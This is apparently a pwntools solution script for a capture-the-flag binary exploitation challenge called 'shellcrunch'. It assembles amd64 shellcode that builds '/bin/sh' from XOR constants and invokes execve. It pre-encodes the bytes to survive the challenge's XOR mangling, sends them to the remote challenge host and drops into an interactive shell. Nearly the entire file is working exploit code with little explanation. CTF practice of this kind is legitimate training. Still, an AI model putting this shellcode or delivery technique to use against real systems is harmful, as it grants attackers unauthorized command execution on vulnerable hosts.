from pwn import *
#io = remote("chal.competitivecyber.club", "3004")

#context.log_level = "debug"
context.arch = "amd64"

# xor valuse to make bin/sh and then push it onto the stack
# this is hard to write comments for
test = asm('''
        xor edi, 0x13141516
        push rax
        push rax
        push rax
        pop rsi
        pop rdx
        push rax
        xor edi, 0x13141516
        pop rdi
        xor edi, 0x9D96DBDB
        xor ecx, 0x13141516
        mov rsp, rbp
        nop
        nop
        xor edi, 0x13141516
        xor ebx, 0x9C87DB9a
        xor ebx, 0x13141516
        shl rbx, 32
        nop
        push rax
        xor ecx, 0x13141516
        add rdi,rbx
        push rdi
        push rsp
        pop rdi
        xor ebx, 0x13141516
        or al, 0x3a
        inc eax
        nop
        nop
        xor ebx, 0x13141516
        syscall
        push rsi
        ''')
i = 0
res = b''
othercount = 4

#to account for the xoring every 4 bits
while i  < (len(test)-1):

    if othercount == 4:
        res += p8(test[i] ^ test[i + 1])
        othercount = 0
    else:
        res += p8(test[i])
    i += 1
    othercount += 1

io = remote("chal.competitivecyber.club", "3004")
#io = process("./shellcrunch", env= {"$PATH" : ".:$PATH"})
io.sendlineafter(b"shellcode",res)

#io = remote("chal.competitivecyber.club", "3004")

io.interactive()
